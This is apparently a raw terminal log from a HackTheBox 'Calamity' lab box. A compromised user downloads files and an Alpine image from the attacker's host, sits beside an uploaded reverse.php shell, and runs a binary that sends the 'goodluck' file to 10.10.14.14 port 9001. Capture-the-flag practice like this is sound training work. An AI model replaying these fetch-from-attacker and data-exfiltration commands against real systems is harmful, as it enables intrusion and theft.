+xalvas@calamity:/var/www/html/uploads$ ls                                       
+metadata.yaml  reverse.php  rootfs      
+xalvas@calamity:/var/www/html/uploads$ cd rootfs/                               
+xalvas@calamity:/var/www/html/uploads/rootfs$ ls                                
+10.10.14.14:8000                        
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd 10.10.14.14\:8000/             
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ ls               
+bin  dev  etc  home  index.html  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var                                                           
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ cd ..            
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd ..                             
+xalvas@calamity:/var/www/html/uploads$ mkdir templates                                                                                                          
+xalvas@calamity:/var/www/html/uploads$ cd templates/                            
+xalvas@calamity:/var/www/html/uploads/templates$ wget -r 10.10.14.14:8888/      
+--2020-01-15 06:17:17--  http://10.10.14.14:8888/                               
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 394 [text/html]                 
+Saving to: ‘10.10.14.14:8888/index.html’
+
+10.10.14.14:8888/index.html             100%[===============================================================================>]     394  --.-KB/s    in 0s       
+
+2020-01-15 06:17:18 (66.5 MB/s) - ‘10.10.14.14:8888/index.html’ saved [394/394] 
+
+Loading robots.txt; please ignore errors.                                       
+--2020-01-15 06:17:18--  http://10.10.14.14:8888/robots.txt                     
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 404 File not found                      
+2020-01-15 06:17:19 ERROR 404: File not found.                                  
+
+--2020-01-15 06:17:19--  http://10.10.14.14:8888/alpine-v3.11-i686-20200115_0409.tar.gz                                                                         
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... ^C                                      
+xalvas@calamity:/var/www/html/uploads/templates$ ^C                             
+xalvas@calamity:/var/www/html/uploads/templates$ ls                             
+10.10.14.14:8888                        
+xalvas@calamity:/var/www/html/uploads/templates$ cd 10.10.14.14\:8888/          
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ ls            
+index.html                              
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ rm index.html 
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ ls            
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ cd ..         
+xalvas@calamity:/var/www/html/uploads/templates$ rmdir 10.10.14.14\:8888/       
+xalvas@calamity:/var/www/html/uploads/templates$ wget -r http://10.10.14.14:8000/                                                                               
+--2020-01-15 06:21:33--  http://10.10.14.14:8000/                               
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... ^C                                      
+xalvas@calamity:/var/www/html/uploads/templates$ wget -r http://10.10.14.14:8888/                                                                               
+--2020-01-15 06:21:58--  http://10.10.14.14:8888/                               
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 260 [text/html]                 
+Saving to: ‘10.10.14.14:8888/index.html’
+
+10.10.14.14:8888/index.html             100%[===============================================================================>]     260  --.-KB/s    in 0s       
+
+2020-01-15 06:21:59 (19.2 MB/s) - ‘10.10.14.14:8888/index.html’ saved [260/260] 
+
+Loading robots.txt; please ignore errors.                                       
+--2020-01-15 06:21:59--  http://10.10.14.14:8888/robots.txt                     
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 404 File not found                      
+2020-01-15 06:21:59 ERROR 404: File not found.                                  
+
+--2020-01-15 06:21:59--  http://10.10.14.14:8888/hostname.tpl                   
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 21 [application/octet-stream]   
+Saving to: ‘10.10.14.14:8888/hostname.tpl’                                      
+
+10.10.14.14:8888/hostname.tpl           100%[===============================================================================>]      21  --.-KB/s    in 0s       
+
+2020-01-15 06:22:00 (3.22 MB/s) - ‘10.10.14.14:8888/hostname.tpl’ saved [21/21] 
+
+--2020-01-15 06:22:00--  http://10.10.14.14:8888/hosts.tpl                      
+Connecting to 10.10.14.14:8888... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 239 [application/octet-stream]  
+Saving to: ‘10.10.14.14:8888/hosts.tpl’ 
+
+10.10.14.14:8888/hosts.tpl              100%[===============================================================================>]     239  --.-KB/s    in 0s       
+
+2020-01-15 06:22:00 (19.6 MB/s) - ‘10.10.14.14:8888/hosts.tpl’ saved [239/239]  
+
+FINISHED --2020-01-15 06:22:00--        
+Total wall clock time: 2.2s             
+Downloaded: 3 files, 520 in 0s (16.1 MB/s)                                      
+xalvas@calamity:/var/www/html/uploads/templates$ ls                             
+10.10.14.14:8888                        
+xalvas@calamity:/var/www/html/uploads/templates$ cd 10.10.14.14\:8888/          
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ ls            
+hostname.tpl  hosts.tpl  index.html     
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ rm index.html 
+xalvas@calamity:/var/www/html/uploads/templates/10.10.14.14:8888$ cd ~          
+xalvas@calamity:~$ ls                   
+alarmclocks  alpine-v3.11-i686-20200115_0409.tar.gz.1  app  dontforget.txt  intrusions  peda  recov.wav  user.txt                                               
+xalvas@calamity:~$ cd /                 
+xalvas@calamity:/$ ls                   
+bin   dev  home        initrd.img.old  lost+found  mnt  proc  run   sec   srv  tmp  var      vmlinuz.old                                                        
+boot  etc  initrd.img  lib             media       opt  root  sbin  snap  sys  usr  vmlinuz                                                                     
+xalvas@calamity:/$ cd root              
+-bash: cd: root: Permission denied      
+xalvas@calamity:/$ cd home/             
+xalvas@calamity:/home$ cd xalvas/       
+xalvas@calamity:~$ ls                   
+alarmclocks  alpine-v3.11-i686-20200115_0409.tar.gz.1  app  dontforget.txt  intrusions  peda  recov.wav  user.txt                                               
+xalvas@calamity:~$ cd app               
+xalvas@calamity:~/app$ ls               
+goodluck  src.c                         
+xalvas@calamity:~/app$ /dev/shm/arr 10.10.14.14 9001 < goodluck                 
+xalvas@calamity:~/app$ exit             
+logout                                  
+Connection to 10.10.10.27 closed.       
+root@parrot:~/hackthebox/calamity/xalvas-files#                                 
